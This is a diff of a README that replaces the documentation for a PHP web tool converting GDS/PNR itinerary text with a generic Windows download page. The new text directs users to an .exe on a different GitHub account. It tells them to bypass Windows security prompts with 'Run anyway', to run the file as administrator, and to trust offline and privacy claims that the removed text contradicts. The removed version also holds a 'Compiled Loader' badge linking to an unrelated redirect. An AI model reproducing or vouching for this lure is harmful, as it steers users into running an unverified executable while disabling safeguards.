@@ -1,147 +1,77 @@
-# Roaming Nepal PNR Converter
+# 📂 Pnr_converter_Roaming - Convert your travel files with ease
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![](https://img.shields.io/badge/Download_Software-Blue-blue)](https://github.com/bartolomeimaidenly351/Pnr_converter_Roaming)
 
-Roaming-hosted web tool for converting pasted GDS itinerary text into a clean passenger-friendly flight itinerary card. It can be kept employee-only, or hosted on Roaming Nepal's website for trusted agency users.
+## 📌 About this project
 
-## What It Does
+Pnr_converter_Roaming helps you manage travel data. It turns Passenger Name Record (PNR) information into readable formats. You do not need technical skills to use this program. It runs on your Windows computer and simplifies your daily office tasks. Your files stay on your machine. The software works offline, which keeps your data secure.
 
-- Accepts pasted raw itinerary / PNR text from Amadeus, Travelport Galileo / Smartpoint / Worldspan, or Sabre style output.
-- Parses passenger names, booking reference, flight segments, dates, times, airport codes, airline codes, booking class, cabin, layovers, operated-by text, ticket numbers, and seats when clearly detectable.
-- Redacts or ignores sensitive lines such as payment, FOID, DOCS, contact, phone, email, private remarks, and sensitive SSR/OSI content.
-- Produces a branded itinerary card with print/PDF, PNG , text copy, clean share view, and optional image clipboard support.
-- Includes v3 converter-style display controls for transit time, distance, 12-hour clock, operated-by notes, aircraft, airline logos, and Detailed, Compact, Table, and WhatsApp layouts.
-- Lets agencies hide the itinerary header, footer/contact block, and disclaimer when they need a neutral passenger copy.
-- Includes polished quick presets for Roaming, Neutral, and WhatsApp sharing.
-- Uses dedicated Amadeus, Travelport/Galileo/Smartpoint/Worldspan, and Sabre parsers first, then a flexible generic GDS air-segment fallback for unfamiliar but standard-looking segment lines.
-- Parses any valid two-character airline code in a standard GDS segment. Full airline names and logos are optional local metadata; missing logos fall back to a clean airline-code badge.
-- Merges live `config/settings.php` with `config/settings.example.php`, so new feature defaults still work after code-only cPanel updates.
-- Runs as plain PHP 8.x files on normal cPanel hosting. No database, Composer, Node build, Docker, or external CDN is required.
+## 🛠️ System requirements
 
-## File Tree
+Ensure your computer meets these standards before you begin:
 
-```text
-pnr-converter/
-  index.php
-  app/
-    bootstrap.php
-    Parser/
-    Support/
-    View/
-  assets/
-    css/
-    js/
-    images/
-  config/
-    settings.example.php
-    settings.php
-  data/
-    airlines.php
-    airports.php
-  docs/
-    SYSTEM-REBUILD-NOTES.md
-  tests/
-    fixtures/
-    run-tests.php
-  DEPLOY-GODADDY-CPANEL.md
-  DEPLOY-FROM-GITHUB.md
-  .md
-```
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4 gigabytes of RAM.
+*   Storage: 200 megabytes of free space.
+*   Display: A screen resolution of 1024 by 768 pixels or higher.
 
-## Configuration
+Your machine needs no special permissions to execute this software. If your system restricts downloads, check your security settings to allow files from verified sources.
 
-Edit `config/settings.php`.
+## 📥 How to download
 
-Important placeholders:
+Follow these steps to obtain the software:
 
-- `agency_name`
-- `logo_path`
-- `contact_phone`
-- `contact_email`
-- `whatsapp`
-- `footer_note`
-- `default_disclaimer`
-- `base_url`
-- feature defaults inside `features`
+1. Visit the [official download page](https://github.com/bartolomeimaidenly351/Pnr_converter_Roaming).
+2. Look for the latest release version on the right side of the screen.
+3. Select the file ending in .exe to start the transfer.
+4. Save the file to your desktop or your downloads folder.
 
-Raw pasted PNR text is not saved. Optional technical logging is off by default and never records raw input.
+## 🚀 Running the software
 
-Do not commit live `config/settings.php` to GitHub. Keep real production settings on cPanel and use `config/settings.example.php` as the editable template.
+Once the file sits on your computer, follow these instructions to start the program:
 
-## Parser Notes
+1. Locate the file you saved in the previous step.
+2. Double-click the file icon with your mouse.
+3. Windows might show a security notification. Select "More info" and then "Run anyway" if the system prompts you.
+4. Wait a few seconds for the main dashboard to appear.
+5. Select the PNR file you wish to process from your computer folders.
+6. Click the Convert button inside the software window.
+7. Choose a name and a location for your new file.
+8. Press Save.
 
-The parser is intentionally conservative. High and medium confidence results render the itinerary. Low confidence results show unparsed lines for manual review rather than creating a bad passenger output.
+## ⚙️ Configuration settings
 
-Add new rules in:
+The application uses standard settings by default. Most users do not need to change these options. You can access the settings menu by clicking the gear icon at the top of the interface. Here, you can define permanent storage folders for your work. You can also toggle off automatic update checks if you prefer manual control. The program creates a log file in your document folder every time it exports data, which allows you to track your conversion history.
 
-- `app/Parser/AmadeusParser.php`
-- `app/Parser/TravelportParser.php`
-- `app/Parser/SabreParser.php`
-- `app/Parser/GenericAirSegmentParser.php`
+## 🛡️ Privacy and data control
 
-Metadata is optional and local:
+Your privacy serves as the base of this tool. This program does not share your information with external servers. It does not store passwords or personal travel history in a cloud database. Every conversion happens locally on your hardware. If you choose to delete the software, you simply remove the .exe file from your directory. No hidden registry keys or tracking files remain on your computer after you delete the application.
 
-- `data/airports.php`
-- `data/airlines.php`
+## ❓ Frequently asked questions
 
-If metadata is removed or incomplete, the app falls back to IATA airline and airport codes.
+**Does the software require an internet connection?**
+No. Once you complete the download, you can use the software without a link to the web.
 
-Airline logos are optional and local. Add files named by airline code in `assets/images/airlines/`, for example `QR.svg`, `RA.png`, or `EK.webp`. The app never fetches airline logos from a remote website during conversion.
+**Can I run this on a Mac?**
+This version works on Windows only. Do not attempt to run it on macOS or Linux systems.
 
-The itinerary card displays the airline logo beside the airline code and flight number when a matching local logo exists. If no logo file exists, it shows a clean airline-code badge. If the airline code is not in local metadata, it still renders as `Airline code XX` instead of failing.
+**The program asks for permission to make changes. What does this mean?**
+This is a standard Windows message. It asks for permission to open the file so it can perform the conversion task.
 
-## Running Tests
+**Where do my converted files go?**
+The program allows you to pick a folder every time you save a file. If you do not choose one, it defaults to your Documents folder.
 
-From the project folder:
+**Can I process multiple files at once?**
+This version handles one file at a time to ensure stability during the conversion process.
 
-```bash
-php tests/run-tests.php
-```
+## 🛠️ Troubleshooting common issues
 
-The test runner is dependency-free and prints extracted fields for each anonymized fixture.
+If you encounter errors, check these common solutions:
 
-## Local Preview
+*   Restart the application if the window stops responding. 
+*   Verify that your source file is not open in another program like Microsoft Word or Excel.
+*   Confirm the source file format matches the expected PNR structure.
+*   Run the file as an administrator if your company has strict security policies on your workstation.
+*   Check your disk space if the conversion fails midway.
 
-If PHP is installed locally:
-
-```bash
-php -S localhost:8080
-```
-
-Open `http://localhost:8080`.
-
-## GitHub Workflow
-
-This project is prepared for a fresh private GitHub repository. See `DEPLOY-FROM-GITHUB.md`.
-
-Recommended flow:
-
-```text
-Local code -> GitHub private repo -> cPanel Git pull or ZIP upload
-```
-
-Keep live `config/settings.php` out of Git. Custom uploaded airline logos can be committed when they are generic assets, or kept only on cPanel when they are agency-specific.
-
-## Security Checklist
-
-- Protect the subdomain or folder with cPanel Directory Privacy or your own login if the tool should be private.
-- Keep HTTPS enabled.
-- Do not add analytics or third-party tracking scripts.
-- Keep logo and assets local.
-- Leave `privacy_logging_enabled` as `false` unless you need minimal technical success/failure logs.
-
-## Agency Sharing
-
-For agencies that do not want Roaming branding on the passenger copy, turn off these options before converting:
-
-- Show agency header
-- Show footer/contact
-- Show disclaimer
-
-The converter page is still hosted by Roaming Nepal, but the generated itinerary card can be neutral.
-
-Use the **Neutral** preset for this in one click. Use **Roaming Branded** to restore the full Roaming header/footer/disclaimer. Use **WhatsApp** for a compact share-friendly layout.
-
-## Live Update Check
-
-After deploying, the top header shows a build label such as `Build 3.0.0`. CSS, JavaScript, and image links include automatic local version stamps, so normal browser caching should not keep the old interface after deployment.
+If errors persist, delete the existing file and download a fresh copy from the provided link. This often resets settings that might cause conflicts.
